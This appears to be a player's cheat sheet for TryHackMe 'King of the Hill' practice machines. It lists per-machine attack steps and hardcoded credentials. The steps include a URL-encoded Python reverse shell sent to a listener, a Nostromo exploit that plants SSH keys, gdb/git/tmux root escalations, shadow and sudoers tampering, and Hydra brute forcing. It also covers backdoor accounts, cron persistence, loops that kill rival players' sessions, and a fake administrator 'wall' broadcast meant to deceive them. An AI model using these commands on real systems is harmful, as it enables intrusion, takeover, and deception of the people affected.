start up the in-browser machine a few minutes before game starts. It takes time.

# useful commands
find all admin commands:

`find / -perm -u=s -type f 2>/dev/null`

run linPEAS.sh(tool that finds potential privilege escalation points)


`curl https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS | sh`  
find sudo commands
`sudo -l`
# notable places:  
/dev/urandom - infinite stream of random characters(usually whitespace and non-ascii)  
/dev/zero - infinite stream of zeroes  
/etc/sudoers - place that determines who is sudo  
/etc/shadow - password place   
/etc/passwd - place that stores users  
/root/king.txt - ideally it stays as Happygator  

# machines:
## food:  

food:givemecookies (telnet or ssh)  
ramen:noodlesRTheBest (ssh)  
pasta:pastaisdynamic  
sudo chmod -xs vim.basic  
afterwards stuff  
```
while :  
	do  
		sudo pkill -9 -u food  
		sudo pkill -9 -u bread  
		sudo pkill -9 -u tryhackme  
done  
```

profit  


## shrek:  
navigate to <ip>/Cpxtpt2hWCee9VFa.txt  
save the rsa key  
```	
chmod 600 <filename>
ssh -i <filename> shrek@<ip>
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit  
```
be root  
copy/paste these in place of shrek's account in /etc/shadow  
```
shrek:$6$RwIzHJ10kWpv2ynr$92aiv.epBTHF53gJSCgywTU6wAqGjuc1LP7gHaRKdJiKTAuOSHHLYFfZnTVI65U0PucUV7Dq/ntD0Nhcf5.yX1:18333:0:99999:7:::  
```
you now have shrek:onionshavelayers  
```make shrek a sudoer  
sudo chmod 0000 /usr/bin/gdb  
cd .ssh  
rm *  
```
grab the flag if someone else hasn't already  
```sudo systemctl stop httpd  
sudo systemctl stop tomcat  
```
afterwards stuff        




## space jam:  
```
ncat -lvnp 4444  
curl "<BOX_IP>:3000/?cmd=python%20-  c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<YOUR_MACHINE_IP>%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"  
LFILE=/root/king.txt  
echo "Happygator" | cp /dev/stdin "$LFILE"  
```
you're king and root  
afterwards stuff  
```
systemctl stop easyaccess  
systemctl stop daemon  
```
change password  
```
killall node(make sure to ssh first)  
chmod /bin/cp 000      
```
???  
profit      

## production:  
navigate to `ftp://anonymous@<ip>:21`  
download id_rsa and the flag, put the flag in  
```
chmod 600 id_rsa
ssh -i id_rsa ashu@<ip>
sudo su skidy
sudo git -p help config
!/bin/sh
```
you have root now, become king
afterwards stuff
```
sudo chmod -sx /usr/lib/git-core/git
```

## Fortune:  
Requires: fcrackzip  
```
nc <BOX_IP> 3333  
```
Returns base 64 hash of a file.    
Go here https://base64.guru/converter/decode/file and get the zip file.  
```
fcrackzip -v -u -D -p <location of rockyou.txt> application.zip  
```
Open the zip with the password you got.  Should contain password for fortune account.  
```
ssh fortuna@<BOX IP>  
sudo pico /etc/sudoers  
```
Replace pico in sudoers file with ALL. (e.g. fortuna    ALL=(ALL:ALL) ALL)  
`sudo su`  
you're root  
stuff to do:   
	change password to fortuna.  
	Remove fortuna from /etc/sudoers and add another user that you have credentials for. 
	
## Lion:
Requires: cve2019-16278.py(file in github), Hydra

```ssh-keygen```

When generating the key, leave the passphrase empty.  This can be done beforehand.

`cat <Your Key Name>.pub` (e.g. cat keygen.pub)

```python2 cve2019_16278.py <KOTH IP> 8080 "mkdir /home/gloria/.ssh; echo '<YOUR *.pub file data>' > /home/gloria/.ssh/authorized_keys"```

Replace <YOUR \*.pub file data> with what you got from the cat.
```
ssh -i <YOUR ssh-keygen FILE> gloria@<KOTH IP> -p 1337 (e.g. ssh -i keygen gloria@<KOTH IP> -p 1337)
/usr/bin/tmux -S /.dev/session
```
You are Now ROOT

Flag Locations
```
/home/gloria/user.txt	 
/home/marty/user.txt	Reversed
/home/alex/user.txt	Rot13
/root/.flag	 
/opt/code/server.py	 
MySQL: db-> blog, table-> users, id-> 140	 
```
Brute force MYSQL Password with Hydra
```
hydra -l root -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> mysql
```

PATCHING
1. Kill Nostromo, and replace with new server.
2. Apply LFI Patch on port 5555.
3. Patch insecure file upload.
4. Change password, do the usual things.


# afterwards stuff:  
sudo useradd technoblade(i typically use password neverdie)  
sudo usermod -aG sudo technoblade  
echo "banana" > /dev/pts/<0 through 9>  
cat /dev/urandom > /dev/pts/<everyone except you> &   
use social engineering wall  

## social engineering wall:
put this in a message.txt file
`This is Irvin. We accidentally used the wrong machine; so we're going to restart this KoTH with the correct machine in order to ensure all teams get a chance. I'll put the correct link once the new machine gets up and running.`
then do:
`sudo wall message.txt`

## script to stay king:
```
sudo crontab -e
```
when the editor pops up put this in and exit  
`* * * * * echo Happygator > /root/king.txt`



